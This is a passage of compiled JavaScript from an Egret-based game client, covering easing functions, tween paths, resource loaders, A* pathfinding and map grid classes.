            };
            HTML5WebSocket.prototype.send = function (message) {
                this.socket.send(message);
            };
            HTML5WebSocket.prototype.close = function () {
                this.socket.close();
            };
            HTML5WebSocket.prototype.disconnect = function () {
                if (this.socket.disconnect) {
                    this.socket.disconnect();
                }
            };
            return HTML5WebSocket;
        }());
        web.HTML5WebSocket = HTML5WebSocket;
        __reflect(HTML5WebSocket.prototype, "egret.web.HTML5WebSocket", ["egret.ISocket"]);
        egret.ISocket = HTML5WebSocket;
    })(web = egret.web || (egret.web = {}));
})(egret || (egret = {}));
var egret;
(function (egret) {
    var Ease = (function () {
        function Ease() {
            egret.$error(1014);
        }
        Ease.get = function (amount) {
            if (amount < -1) {
                amount = -1;
            }
            if (amount > 1) {
                amount = 1;
            }
            return function (t) {
                if (amount == 0) {
                    return t;
                }
                if (amount < 0) {
                    return t * (t * -amount + 1 + amount);
                }
                return t * ((2 - t) * amount + (1 - amount));
            };
        };
        Ease.getPowIn = function (pow) {
            return function (t) {
                return Math.pow(t, pow);
            };
        };
        Ease.getPowOut = function (pow) {
            return function (t) {
                return 1 - Math.pow(1 - t, pow);
            };
        };
        Ease.getPowInOut = function (pow) {
            return function (t) {
                if ((t *= 2) < 1)
                    return 0.5 * Math.pow(t, pow);
                return 1 - 0.5 * Math.abs(Math.pow(2 - t, pow));
            };
        };
        Ease.sineIn = function (t) {
            return 1 - Math.cos(t * Math.PI / 2);
        };
        Ease.sineOut = function (t) {
            return Math.sin(t * Math.PI / 2);
        };
        Ease.sineInOut = function (t) {
            return -0.5 * (Math.cos(Math.PI * t) - 1);
        };
        Ease.getBackIn = function (amount) {
            return function (t) {
                return t * t * ((amount + 1) * t - amount);
            };
        };
        Ease.getBackOut = function (amount) {
            return function (t) {
                return (--t * t * ((amount + 1) * t + amount) + 1);
            };
        };
        Ease.getBackInOut = function (amount) {
            amount *= 1.525;
            return function (t) {
                if ((t *= 2) < 1)
                    return 0.5 * (t * t * ((amount + 1) * t - amount));
                return 0.5 * ((t -= 2) * t * ((amount + 1) * t + amount) + 2);
            };
        };
        Ease.circIn = function (t) {
            return -(Math.sqrt(1 - t * t) - 1);
        };
        Ease.circOut = function (t) {
            return Math.sqrt(1 - (--t) * t);
        };
        Ease.circInOut = function (t) {
            if ((t *= 2) < 1) {
                return -0.5 * (Math.sqrt(1 - t * t) - 1);
            }
            return 0.5 * (Math.sqrt(1 - (t -= 2) * t) + 1);
        };
        Ease.bounceIn = function (t) {
            return 1 - Ease.bounceOut(1 - t);
        };
        Ease.bounceOut = function (t) {
            if (t < 1 / 2.75) {
                return (7.5625 * t * t);
            }
            else if (t < 2 / 2.75) {
                return (7.5625 * (t -= 1.5 / 2.75) * t + 0.75);
            }
            else if (t < 2.5 / 2.75) {
                return (7.5625 * (t -= 2.25 / 2.75) * t + 0.9375);
            }
            else {
                return (7.5625 * (t -= 2.625 / 2.75) * t + 0.984375);
            }
        };
        Ease.bounceInOut = function (t) {
            if (t < 0.5)
                return Ease.bounceIn(t * 2) * .5;
            return Ease.bounceOut(t * 2 - 1) * 0.5 + 0.5;
        };
        Ease.getElasticIn = function (amplitude, period) {
            var pi2 = Math.PI * 2;
            return function (t) {
                if (t == 0 || t == 1)
                    return t;
                var s = period / pi2 * Math.asin(1 / amplitude);
                return -(amplitude * Math.pow(2, 10 * (t -= 1)) * Math.sin((t - s) * pi2 / period));
            };
        };
        Ease.getElasticOut = function (amplitude, period) {
            var pi2 = Math.PI * 2;
            return function (t) {
                if (t == 0 || t == 1)
                    return t;
                var s = period / pi2 * Math.asin(1 / amplitude);
                return (amplitude * Math.pow(2, -10 * t) * Math.sin((t - s) * pi2 / period) + 1);
            };
        };
        Ease.getElasticInOut = function (amplitude, period) {
            var pi2 = Math.PI * 2;
            return function (t) {
                var s = period / pi2 * Math.asin(1 / amplitude);
                if ((t *= 2) < 1)
                    return -0.5 * (amplitude * Math.pow(2, 10 * (t -= 1)) * Math.sin((t - s) * pi2 / period));
                return amplitude * Math.pow(2, -10 * (t -= 1)) * Math.sin((t - s) * pi2 / period) * 0.5 + 1;
            };
        };
        Ease.quadIn = Ease.getPowIn(2);
        Ease.quadOut = Ease.getPowOut(2);
        Ease.quadInOut = Ease.getPowInOut(2);
        Ease.cubicIn = Ease.getPowIn(3);
        Ease.cubicOut = Ease.getPowOut(3);
        Ease.cubicInOut = Ease.getPowInOut(3);
        Ease.quartIn = Ease.getPowIn(4);
        Ease.quartOut = Ease.getPowOut(4);
        Ease.quartInOut = Ease.getPowInOut(4);
        Ease.quintIn = Ease.getPowIn(5);
        Ease.quintOut = Ease.getPowOut(5);
        Ease.quintInOut = Ease.getPowInOut(5);
        Ease.backIn = Ease.getBackIn(1.7);
        Ease.backOut = Ease.getBackOut(1.7);
        Ease.backInOut = Ease.getBackInOut(1.7);
        Ease.elasticIn = Ease.getElasticIn(1, 0.3);
        Ease.elasticOut = Ease.getElasticOut(1, 0.3);
        Ease.elasticInOut = Ease.getElasticInOut(1, 0.3 * 1.5);
        return Ease;
    }());
    egret.Ease = Ease;
    __reflect(Ease.prototype, "egret.Ease");
})(egret || (egret = {}));
var RES;
(function (RES) {
    var path;
    (function (path_1) {
        function normalize(filename) {
            var arr = filename.split("/");
            return arr.filter(function (value, index) { return !!value || index == arr.length - 1; }).join("/");
        }
        path_1.normalize = normalize;
        function basename(filename) {
            return filename.substr(filename.lastIndexOf("/") + 1);
        }
        path_1.basename = basename;
        function dirname(path) {
            return path.substr(0, path.lastIndexOf("/"));
        }
        path_1.dirname = dirname;
    })(path = RES.path || (RES.path = {}));
})(RES || (RES = {}));
var egret;
(function (egret) {
    var tween;
    (function (tween) {
        var BasePath = (function (_super) {
            __extends(BasePath, _super);
            function BasePath() {
                var _this = _super !== null && _super.apply(this, arguments) || this;
                _this.name = "";
                return _this;
            }
            return BasePath;
        }(egret.EventDispatcher));
        tween.BasePath = BasePath;
        __reflect(BasePath.prototype, "egret.tween.BasePath");
        var To = (function (_super) {
            __extends(To, _super);
            function To() {
                var _this = _super !== null && _super.apply(this, arguments) || this;
                _this.props = undefined;
                _this.duration = 500;
                _this.ease = undefined;
                return _this;
            }
            return To;
        }(BasePath));
        tween.To = To;
        __reflect(To.prototype, "egret.tween.To");
        var Wait = (function (_super) {
            __extends(Wait, _super);
            function Wait() {
                var _this = _super !== null && _super.apply(this, arguments) || this;
                _this.duration = 500;
                _this.passive = undefined;
                return _this;
            }
            return Wait;
        }(BasePath));
        tween.Wait = Wait;
        __reflect(Wait.prototype, "egret.tween.Wait");
        var Set = (function (_super) {
            __extends(Set, _super);
            function Set() {
                var _this = _super !== null && _super.apply(this, arguments) || this;
                _this.props = undefined;
                return _this;
            }
            return Set;
        }(BasePath));
        tween.Set = Set;
        __reflect(Set.prototype, "egret.tween.Set");
        var Tick = (function (_super) {
            __extends(Tick, _super);
            function Tick() {
                var _this = _super !== null && _super.apply(this, arguments) || this;
                _this.delta = 0;
                return _this;
            }
            return Tick;
        }(BasePath));
        tween.Tick = Tick;
        __reflect(Tick.prototype, "egret.tween.Tick");
        function convertEase(ease) {
            if (typeof ease === 'function') {
                return ease;
            }
            else {
                var func = egret.Ease[ease];
                if (typeof func === 'function') {
                    return func;
                }
            }
            return null;
        }
        var TweenItem = (function (_super) {
            __extends(TweenItem, _super);
            function TweenItem() {
                var _this = _super.call(this) || this;
                _this.isStop = false;
                return _this;
            }
            Object.defineProperty(TweenItem.prototype, "props", {
                get: function () {
                    return this._props;
                },
                set: function (value) {
                    this._props = value;
                },
                enumerable: true,
                configurable: true
            });
            Object.defineProperty(TweenItem.prototype, "target", {
                get: function () {
                    return this._target;
                },
                set: function (value) {
                    this._target = value;
                },
                enumerable: true,
                configurable: true
            });
            Object.defineProperty(TweenItem.prototype, "paths", {
                get: function () {
                    return this._paths;
                },
                set: function (value) {
                    this._paths = value || [];
                },
                enumerable: true,
                configurable: true
            });
            TweenItem.prototype.play = function (position) {
                if (!this.tween) {
                    this.createTween(position);
                }
                else {
                    this.tween.setPaused(false);
                    if (this.isStop && position == undefined) {
                        position = 0;
                        this.isStop = false;
                    }
                    if (position !== undefined && position !== null) {
                        this.tween.setPosition(position);
                    }
                }
            };
            TweenItem.prototype.pause = function () {
                if (this.tween) {
                    this.tween.setPaused(true);
                }
            };
            TweenItem.prototype.stop = function () {
                this.pause();
                this.isStop = true;
            };
            TweenItem.prototype.createTween = function (position) {
                this.tween = egret.Tween.get(this._target, this._props);
                if (this._paths) {
                    this.applyPaths();
                }
                if (position !== undefined && position !== null) {
                    this.tween.setPosition(position);
                }
            };
            TweenItem.prototype.applyPaths = function () {
                for (var i = 0; i < this._paths.length; i++) {
                    var path = this._paths[i];
                    this.applyPath(path);
                }
            };
            TweenItem.prototype.applyPath = function (path) {
                var _this = this;
                if (path instanceof To) {
                    this.tween.to(path.props, path.duration, convertEase(path.ease));
                }
                else if (path instanceof Wait) {
                    this.tween.wait(path.duration, path.passive);
                }
                else if (path instanceof Set) {
                    this.tween.set(path.props);
                }
                else if (path instanceof Tick) {
                    this.tween.$tick(path.delta);
                }
                this.tween.call(function () { return _this.pathComplete(path); });
            };
            TweenItem.prototype.pathComplete = function (path) {
                path.dispatchEventWith('complete');
                this.dispatchEventWith('pathComplete', false, path);
                var index = this._paths.indexOf(path);
                if (index >= 0 && index === this._paths.length - 1) {
                    this.dispatchEventWith('complete');
                }
            };
            return TweenItem;
        }(egret.EventDispatcher));
        tween.TweenItem = TweenItem;
        __reflect(TweenItem.prototype, "egret.tween.TweenItem");
        registerProperty(TweenItem, 'paths', 'Array', true);
        var TweenGroup = (function (_super) {
            __extends(TweenGroup, _super);
            function TweenGroup() {
                var _this = _super.call(this) || this;
                _this.completeCount = 0;
                return _this;
            }
            Object.defineProperty(TweenGroup.prototype, "items", {
                get: function () {
                    return this._items;
                },
                set: function (value) {
                    this.completeCount = 0;
                    this.registerEvent(false);
                    this._items = value;
                    this.registerEvent(true);
                },
                enumerable: true,
                configurable: true
            });
            TweenGroup.prototype.registerEvent = function (add) {
                var _this = this;
                this._items && this._items.forEach(function (item) {
                    if (add) {
                        item.addEventListener('complete', _this.itemComplete, _this);
                    }
                    else {
                        item.removeEventListener('complete', _this.itemComplete, _this);
                    }
                });
            };
            TweenGroup.prototype.play = function (time) {
                if (!this._items) {
                    return;
                }
                for (var i = 0; i < this._items.length; i++) {
                    var item = this._items[i];
                    item.play(time);
                }
            };
            TweenGroup.prototype.pause = function () {
                if (!this._items) {
                    return;
                }
                for (var i = 0; i < this._items.length; i++) {
                    var item = this._items[i];
                    item.pause();
                }
            };
            TweenGroup.prototype.stop = function () {
                if (!this._items) {
                    return;
                }
                for (var i = 0; i < this._items.length; i++) {
                    var item = this._items[i];
                    item.stop();
                }
            };
            TweenGroup.prototype.itemComplete = function (e) {
                var item = e.currentTarget;
                this.completeCount++;
                this.dispatchEventWith('itemComplete', false, item);
                if (this.completeCount === this.items.length) {
                    this.dispatchEventWith('complete');
                    this.completeCount = 0;
                }
            };
            return TweenGroup;
        }(egret.EventDispatcher));
        tween.TweenGroup = TweenGroup;
        __reflect(TweenGroup.prototype, "egret.tween.TweenGroup");
        registerProperty(TweenGroup, 'items', 'Array', true);
        function registerProperty(classDefinition, property, type, asDefault) {
            var prototype = classDefinition.prototype;
            prototype.__meta__ = prototype.__meta__ || {};
            prototype.__meta__[property] = type;
            if (asDefault) {
                prototype.__defaultProperty__ = property;
            }
        }
    })(tween = egret.tween || (egret.tween = {}));
})(egret || (egret = {}));
var FontCustomProcessor = {
    onLoadStart: function (host, resource) {
        return host.load(resource, 'text').then(function (data) {
            var config;
            try {
                config = JSON.parse(data);
            }
            catch (e) {
                config = data;
            }
            var imageName;
            if (typeof config === 'string') {
                imageName = RecycleMgr.ins().fontGetTexturePath(resource.url, config);
            }
            else {
                imageName = RES.processor.getRelativePath(resource.url, config.file);
            }
            var resourceInfo = host.resourceConfig.getResource(RES.nameSelector(imageName));
            if (!resourceInfo) {
                resourceInfo = { name: imageName, url: imageName, type: 'image', root: resource.root };
            }
            RecycleMgr.ins().fonts[resourceInfo.name] = resource.name;
            return host.load(resourceInfo).then(function (texture) {
                var font = new egret.BitmapFont(texture, config);
                font["$resourceInfo"] = resourceInfo;
                host.save(resourceInfo, texture);
                return font;
            }, function (e) {
                host.remove(resourceInfo);
                throw e;
            });
        });
    },
    onRemoveStart: function (host, resource) {
        var font = host.get(resource);
        var resourceInfo = font["$resourceInfo"];
        host.unload(resourceInfo);
    }
};
RES.processor.map(RES.ResourceItem.TYPE_FONT, FontCustomProcessor);
var ImageCustomProcessor = {
    onLoadStart: function (host, resource) {
        var _this = this;
        return new Promise(function (reslove, reject) {
            var loader = new egret.ImageLoader();
            loader.load(RES.getVirtualUrl(resource.root + resource.url));
            var onSuccess = function () {
                var value = loader['data'] ? loader['data'] : loader['response'];
                var texture = new egret.Texture();
                texture._setBitmapData(value);
                var resourceInfo = host.resourceConfig.getResource(resource.name);
                if (resourceInfo && resourceInfo.scale9grid) {
                    var list = resourceInfo.scale9grid.split(",");
                    texture["scale9Grid"] = new egret.Rectangle(parseInt(list[0]), parseInt(list[1]), parseInt(list[2]), parseInt(list[3]));
                }
                RecycleMgr.ins().addImage(resource.name, { resource: resource, texture: texture });
                reslove(texture);
            };
            var onError = function () {
                var error = new RES.ResourceManagerError(1001, resource.url);
                reject(error);
            };
            loader.addEventListener(egret.Event.COMPLETE, onSuccess, _this);
            loader.addEventListener(egret.IOErrorEvent.IO_ERROR, onError, _this);
        });
    },
    onRemoveStart: function (host, resource) {
        RecycleMgr.ins().delImage(resource.name);
        var texture = host.get(resource);
        texture.dispose();
    }
};
RES.processor.map(RES.ResourceItem.TYPE_IMAGE, ImageCustomProcessor);
var JsonCustomProcessor = {
    onLoadStart: function (host, resource) {
        return host.load(resource, 'text').then(function (text) {
            var json = JSON.parse(text);
            RecycleMgr.ins().jsons[resource.name] = { resource: resource, json: json };
            return json;
        });
    },
    onRemoveStart: function (host, resource) {
        delete RecycleMgr.ins().jsons[resource.name];
    }
};
RES.processor.map(RES.ResourceItem.TYPE_JSON, JsonCustomProcessor);
var SheetCustomProcessor = {
    onLoadStart: function (host, resource) {
        return host.load(resource, "json").then(function (data) {
            var resourceInfo = host.resourceConfig.getResource(RES.nameSelector(data.file));
            if (!resourceInfo) {
                var imageName = RES.processor.getRelativePath(resource.url, data.file);
                resourceInfo = { name: imageName, url: imageName, type: 'image', root: resource.root };
            }
            RecycleMgr.ins().sheets[resourceInfo.name] = resource.name;
            return host.load(resourceInfo).then(function (bitmapData) {
                if (!bitmapData) {
                    return null;
                }
                var frames = data.frames;
                var spriteSheet = new egret.SpriteSheet(bitmapData);
                spriteSheet["$resourceInfo"] = resourceInfo;
                for (var subkey in frames) {
                    var config = frames[subkey];
                    var texture = spriteSheet.createTexture(subkey, config.x, config.y, config.w, config.h, config.offX, config.offY, config.sourceW, config.sourceH);
                    if (config["scale9grid"]) {
                        var list = config["scale9grid"].split(",");
                        texture["scale9Grid"] = new egret.Rectangle(parseInt(list[0]), parseInt(list[1]), parseInt(list[2]), parseInt(list[3]));
                    }
                }
                host.save(resourceInfo, bitmapData);
                return spriteSheet;
            }, function (e) {
                host.remove(resourceInfo);
                throw e;
            });
        });
    },
    getData: function (host, resource, key, subkey) {
        var data = host.get(resource);
        if (data) {
            return data.getTexture(subkey);
        }
        else {
            return null;
        }
    },
    onRemoveStart: function (host, resource) {
        var sheet = host.get(resource);
        var resourceInfo = sheet["$resourceInfo"];
        sheet.dispose();
        host.unload(resourceInfo);
        delete RecycleMgr.ins().jsons[resource.name];
    }
};
RES.processor.map(RES.ResourceItem.TYPE_SHEET, SheetCustomProcessor);
var AStar = (function () {
    function AStar() {
        this.m_nMarkTag = 0;
        this.grid = this.grid || new MapGrid;
    }
    AStar.prototype.init = function (mapInfo, turn) {
        this.grid.init(mapInfo, turn);
        var nOldCount = 0;
        if (this.m_MapCells) {
            nOldCount = this.m_MapCells.length;
        }
        else {
            this.m_MapCells = [];
        }
        this.m_nCols = this.grid.mapCol;
        this.m_nRows = this.grid.mapRow;
        var nNewCount = this.m_nCols * this.m_nRows;
        if (nNewCount > this.m_MapCells.length) {
            this.m_MapCells.length = nNewCount;
        }
        for (var i_1 = nOldCount; i_1 < nNewCount; ++i_1) {
            this.m_MapCells[i_1] = new MapCell;
        }
        var x;
        var y;
        var i = 0;
        var cell;
        for (y = 0; y < this.m_nRows; ++y) {
            for (x = 0; x < this.m_nCols; ++x) {
                cell = this.m_MapCells[i];
                cell.x = x;
                cell.y = y;
                cell.block = this.grid.isBlock(x, y);
                i++;
            }
        }
    };
    AStar.prototype.findPatch = function (fromX, fromY, targetX, targetY) {
        if (fromX == targetX && fromY == targetY) {
            return null;
        }
        if (fromX < 0 || fromX >= this.m_nCols || fromY < 0 || fromY >= this.m_nRows) {
            return null;
        }
        if (targetX < 0 || targetX >= this.m_nCols || targetY < 0 || targetY >= this.m_nRows) {
            return null;
        }
        var ac = this.m_MapCells[targetY * this.m_nCols + targetX];
        if (!ac || ac.block) {
            return null;
        }
        this.reset(fromX, fromY);
        var boPathFound = false;
        var nCurX = fromX;
        var nCurY = fromY;
        var curCell = this.m_MapCells[nCurY * this.m_nCols + nCurX];
        curCell.g = 0;
        curCell.LastX = -1;
        curCell.LastY = -1;
        curCell.x = nCurX;
        curCell.y = nCurY;
        curCell.MarkTag = this.m_nMarkTag;
        curCell.h = Math.abs(targetX - fromX) + 10 * Math.abs(targetY - fromY);
        var i;
        var nX;
        var nY;
        var cell;
        var d;
        var g;
        var v;
        var y;
        while (true) {
            if (nCurX == targetX && nCurY == targetY) {
                boPathFound = true;
                break;
            }
            if (curCell.State != MapCell.CSCLOSE) {
                this.closeCell(curCell);
            }
            for (i = 0; i < 8; ++i) {
                nX = nCurX + AStar.NEIGHBORPOS_X_VALUES[i];
                nY = nCurY + AStar.NEIGHBORPOS_Y_VALUES[i];
                if (nX < 0 || nX >= this.m_nCols || nY < 0 || nY >= this.m_nRows) {
                    continue;
                }
                cell = this.m_MapCells[nY * this.m_nCols + nX];
                d = 1 & i;
                if (cell.block) {
                    if (!d) {
                        i++;
                    }
                }
                else {
                    if (d) {
                        g = 7 == i ? 0 : i + 1;
                        v = nCurX + AStar.NEIGHBORPOS_X_VALUES[g];
                        y = nCurY + AStar.NEIGHBORPOS_Y_VALUES[g];
                    }
                    if (!d || (d && !this.m_MapCells[y * this.m_nCols + v].block)) {
                        if (cell.MarkTag != this.m_nMarkTag || cell.State == MapCell.CSNONE) {
                            cell.MarkTag = this.m_nMarkTag;
                            cell.LastX = nCurX;
                            cell.LastY = nCurY;
                            cell.dir = i;
                            cell.g = curCell.g + AStar.AS_MOVECOST[d];
                            cell.h = 10 * (Math.abs(targetX - nX) + Math.abs(targetY - nY));
                            this.openCell(cell);
                        }
                        else if (cell.State == MapCell.CSOPEN && cell.g > curCell.g + AStar.AS_MOVECOST[d]) {
                            cell.LastX = nCurX;
                            cell.LastY = nCurY;
                            cell.dir = i;
                            cell.g = curCell.g + AStar.AS_MOVECOST[d];
                            this.reopenCell(cell);
                        }
                    }
                }
            }
            curCell = this.m_LastOpenCell;
            if (curCell == null) {
                break;
            }
            nCurX = curCell.x;
            nCurY = curCell.y;
        }
        if (boPathFound) {
            var result = [];
            var lastNode = undefined;
            while (true) {
                if (!(lastNode && lastNode.dir == curCell.dir)) {
                    lastNode = new AStarNode(curCell.x, curCell.y, curCell.dir);
                    result.push(lastNode);
                }
                curCell = this.m_MapCells[curCell.LastY * this.m_nCols + curCell.LastX];
                if (curCell.LastX <= 0 && curCell.LastY <= 0 || curCell.MarkTag != this.m_nMarkTag) {
                    break;
                }
            }
            return result;
        }
        return null;
    };
    AStar.prototype.reset = function (cX, cY) {
        var cell = this.m_MapCells[cY * this.m_nCols + cX];
        if (cell) {
            cell.LastX = 0;
            cell.LastY = 0;
            cell.h = 0;
            cell.g = 0;
            cell.f = 0;
            cell.State = 0;
            cell.Prev = null;
            cell.Next = null;
            cell.dir = 0;
        }
        this.m_LastOpenCell = null;
        this.m_nMarkTag = this.m_nMarkTag + 1;
    };
    AStar.prototype.closeCell = function (cell) {
        if (cell.State == MapCell.CSOPEN) {
            if (cell.Prev) {
                cell.Prev.Next = cell.Next;
            }
            if (cell.Next) {
                cell.Next.Prev = cell.Prev;
            }
            if (cell == this.m_LastOpenCell) {
                this.m_LastOpenCell = cell.Prev;
            }
        }
        cell.State = MapCell.CSCLOSE;
    };
    AStar.prototype.openCell = function (cell) {
        cell.State = MapCell.CSOPEN;
        var nFValue = cell.h + cell.g;
        cell.f = nFValue;
        var lastCell = this.m_LastOpenCell;
        if (!lastCell) {
            this.m_LastOpenCell = cell;
            cell.Prev = null;
            cell.Next = null;
        }
        else {
            while (lastCell.f < nFValue) {
                if (lastCell.Prev == null) {
                    lastCell.Prev = cell;
                    cell.Prev = null;
                    cell.Next = lastCell;
                    return;
                }
                lastCell = lastCell.Prev;
            }
            cell.Prev = lastCell;
            if (lastCell.Next) {
                cell.Next = lastCell.Next;
                lastCell.Next.Prev = cell;
                lastCell.Next = cell;
            }
            else {
                cell.Next = null;
                lastCell.Next = cell;
                this.m_LastOpenCell = cell;
            }
        }
    };
    AStar.prototype.reopenCell = function (cell) {
        var nFValue = cell.h + cell.g;
        cell.f = nFValue;
        var nextCell = cell.Next;
        if (nextCell && nextCell.f > nFValue) {
            do {
                nextCell = nextCell.Next;
            } while (nextCell && nextCell.f > nFValue);
            if (cell.Prev) {
                cell.Prev.Next = cell.Next;
            }
            if (cell.Next) {
                cell.Next.Prev = cell.Prev;
            }
            if (nextCell) {
                cell.Next = nextCell;
                if (nextCell.Prev) {
                    cell.Prev = nextCell.Prev;
                    nextCell.Prev.Next = cell;
                }
                else {
                    cell.Prev = null;
                }
                nextCell.Prev = cell;
            }
            else {
                cell.Prev = this.m_LastOpenCell;
                cell.Next = null;
                this.m_LastOpenCell.Next = cell;
                this.m_LastOpenCell = cell;
            }
        }
    };
    AStar.prototype.isWalkable = function (x, y) {
        var rtn = false;
        var node = this.grid.getNode(x, y);
        if (!node) {
            debug.error("WalkablePoint:" + x + "," + y + "error!");
        }
        else {
            rtn = !node.block;
        }
        return rtn;
    };
    AStar.prototype.isAlpha = function (x, y) {
        var rtn = false;
        var node = this.grid.getNode(x, y);
        if (!node) {
            debug.error("AlphaPoint:" + x + "," + y + "error!");
        }
        else {
            rtn = node.alpha;
        }
        return rtn;
    };
    AStar.NEIGHBORPOS_X_VALUES = [0, 1, 1, 1, 0, -1, -1, -1];
    AStar.NEIGHBORPOS_Y_VALUES = [-1, -1, 0, 1, 1, 1, 0, -1];
    AStar.AS_MOVECOST = [10, 14];
    return AStar;
}());
__reflect(AStar.prototype, "AStar");
var MapCell = (function () {
    function MapCell() {
    }
    MapCell.CSNONE = 0;
    MapCell.CSOPEN = 1;
    MapCell.CSCLOSE = 2;
    return MapCell;
}());
__reflect(MapCell.prototype, "MapCell");
var AStarNode = (function () {
    function AStarNode(x, y, dir) {
        this.x = x;
        this.y = y;
        this.dir = dir;
    }
    return AStarNode;
}());
__reflect(AStarNode.prototype, "AStarNode");
var Bresenham = (function () {
    function Bresenham() {
    }
    Bresenham.canThrough = function (astar, sx, sy, ex, ey) {
        var x1 = 0, y1 = 0, x2 = 0, y2 = 0;
        var xstep = 0, ystep = 0, dx = 0, x = 0, y = 0, lastY = 0;
        var ny = 0, k = 0, b = 0, i = 0;
        var result = new Array(4);
        result[0] = 0;
        result[1] = 0;
        k = (ey - sy) / (ex - sx);
        b = ey - k * ex;
        xstep = ex > sx ? 1 : -1;
        ystep = ey > sy ? 1 : -1;
        x1 = sx >> 0, y1 = sy >> 0, x2 = ex >> 0, y2 = ey >> 0;
        dx = x2 - x1, dx = (dx ^ (dx >> 31)) - (dx >> 31);
        result[2] = x = x1;
        result[3] = lastY = y1;
        for (i = 0; i < dx; i++) {
            x += xstep;
            ny = k * x + b;
            y = ny >> 0;
            while (lastY != y) {
                lastY += ystep;
                if (!astar.isWalkable(x, lastY)) {
                    return result;
                }
                result[2] = x;
                result[3] = lastY;
            }
            if (!astar.isWalkable(x, y)) {
                return result;
            }
            result[2] = x;
            result[3] = y;
        }
        while (lastY != y2) {
            lastY += ystep;
            if (!astar.isWalkable(x, lastY)) {
                return result;
            }
            result[2] = x;
            result[3] = lastY;
        }
        result[0] = 1;
        return result;
    };
    Bresenham.lineGrids = function (ox, oy, tx, ty) {
        var fun = function (ox, oy, tx, ty) {
            var intercep = (ty - oy) / (tx - ox);
            var val = ty - intercep * tx;
            var dir = tx > ox ? 1 : -1;
            var dis = Math.abs(tx - ox);
            var datas = [];
            for (var i = 0; dis > i; ++i) {
                var x = ox + i * dir >> 0;
                var y = intercep * x + val >> 0;
                datas.push(x);
                datas.push(y);
            }
            if (1 >= dis && Math.abs(ty - oy) > 1) {
                dis = Math.abs(ty - oy);
                for (var j = 0; dis > j; ++j) {
                    var x = ox;
                    var y = ty > oy ? oy++ : oy--;
                    if (datas[datas.length - 2] != x || datas[datas.length - 1] != y) {
                        datas.push(x);
                        datas.push(y);
                    }
                }
            }
            if (datas[datas.length - 2] != tx && datas[datas.length - 1] != ty) {
                datas.push(tx);
                datas.push(ty);
            }
            return datas;
        };
        var result = fun(ox, oy, tx, ty);
        var datas = [];
        for (var i = 0; i < result.length; i += 2) {
            var sx = result[i];
            var sy = result[i + 1];
            if (result.length > i + 2) {
                var ex = result[i + 2];
                var ey = result[i + 3];
                if (Math.abs(sx - ex) > 1 || Math.abs(sy - ey) > 1) {
                    var points = fun(sx, sy, ex, ey);
                    points.splice(0, 2);
                    points.splice(points.length - 2, 2);
                    datas = datas.concat(points);
                }
            }
        }
        if (Math.abs(result[result.length - 2] - tx) > 1 || Math.abs(result[result.length - 1] - ty) > 1) {
            var points = fun(result[result.length - 2], result[result.length - 1], tx, ty);
            points.splice(0, 2);
            datas = datas.concat(points);
        }
        return result.concat(datas);
    };
    return Bresenham;
}());
__reflect(Bresenham.prototype, "Bresenham");
var MapGrid = (function (_super) {
    __extends(MapGrid, _super);
    function MapGrid() {
        var _this = _super.call(this) || this;
        _this.touchEnabled = false;
        _this._poolNodes = [];
        return _this;
    }
    MapGrid.prototype.init = function (mapInfo, turn) {
        if (this._nodes) {
            this.clearNodes();
        }
        this._mapCol = mapInfo.mapCol;
        this._mapRow = mapInfo.mapRow;
        this._nodes = [];
        var node;
        for (var i = 0; i < this._mapCol; i++) {
            this._nodes[i] = [];
            for (var j = 0; j < this._mapRow; j++) {
                node = this.getGridNode();
                node.data = mapInfo.datas[i * this._mapRow + j];
                this._nodes[i][j] = node;
            }
        }
        if (turn) {
            this._nodes.reverse();
        }
    };
    MapGrid.prototype.getGridNode = function () {
        return this._poolNodes.pop() || new MapNode();
    };
    Object.defineProperty(MapGrid.prototype, "mapCol", {
        get: function () {
            return this._mapCol;
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(MapGrid.prototype, "mapRow", {
        get: function () {
            return this._mapRow;
        },
        enumerable: true,
        configurable: true
    });
    MapGrid.prototype.getNode = function (x, y) {
        if (this._nodes && this._nodes[x]) {
            return this._nodes[x][y];
        }
        return undefined;
    };
    MapGrid.prototype.isBlock = function (x, y) {
        if (x < 0 || x >= this._mapCol || y < 0 || y >= this._mapRow) {
            return true;
        }
        return this._nodes[x][y].block;
    };
    MapGrid.prototype.clearNodes = function () {
        for (var i in this._nodes) {
            this._poolNodes = this._poolNodes.concat(this._nodes[i]);
            this._nodes[i].length = 0;
        }
        this._nodes.length = 0;
    };
    return MapGrid;
}(egret.Sprite));
__reflect(MapGrid.prototype, "MapGrid");
var MapNode = (function () {
    function MapNode() {
    }
    Object.defineProperty(MapNode.prototype, "alpha", {
        get: function () {
            return (this.data & (1 << 1)) > 0;
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(MapNode.prototype, "block", {
        get: function () {
            return (this.data & (1 << 0)) <= 0;
        },
        enumerable: true,
        configurable: true
    });
    return MapNode;
}());
__reflect(MapNode.prototype, "MapNode");
var BaseComponent = (function (_super) {
    __extends(BaseComponent, _super);
    function BaseComponent() {
        var _this = _super.call(this) || this;
        _this.className = "Must fill className";
        return _this;
    }
    Object.defineProperty(BaseComponent.prototype, "data", {
        get: function () {
            return this["_data"];
        },
        set: function (value) {
            this["_data"] = value;
            eui.PropertyEvent.dispatchPropertyEvent(this, eui.PropertyEvent.PROPERTY_CHANGE, "data");
            if (this["dataChanged"])
                this["dataChanged"]();
        },
        enumerable: true,
        configurable: true
    });
    BaseComponent.filterKeys = ["data"];
    BaseComponent.copyKeys = ["open", "close"];
    return BaseComponent;
}(BasePanel));
__reflect(BaseComponent.prototype, "BaseComponent");
var BaseItemRender = (function (_super) {
    __extends(BaseItemRender, _super);
    function BaseItemRender() {
        return _super.call(this) || this;
    }
    BaseItemRender.prototype.addEvent = function (ev, obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        if (!obj) {
            debug.error("Not binding object");
            return;
        }
        obj.addEventListener(ev, func, thisObj);
    };
    BaseItemRender.prototype.removeEvent = function (ev, obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        if (obj) {
            obj.removeEventListener(ev, func, thisObj);
        }
    };
    BaseItemRender.prototype.addEventTouchTap = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.addEvent(egret.TouchEvent.TOUCH_TAP, obj, func, thisObj);
    };
    BaseItemRender.prototype.removeEventTouchTap = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.removeEvent(egret.TouchEvent.TOUCH_TAP, obj, func, thisObj);
    };
    BaseItemRender.prototype.addEventTouchEnd = function (obj, func, thisObj) {
